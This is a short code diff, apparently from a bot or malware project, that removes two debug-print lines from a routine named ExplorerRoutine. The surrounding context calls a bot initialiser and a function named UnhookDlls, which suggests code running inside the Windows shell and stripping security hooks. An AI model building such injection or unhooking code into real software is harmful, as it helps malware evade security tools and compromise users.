@@ -215,11 +215,7 @@ void ExplorerMain()
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
-		pOutputDebugStringA("3");
-
 	BOT::Initialize();
-	pOutputDebugStringA("4");
-
 
 	UnhookDlls();
 	
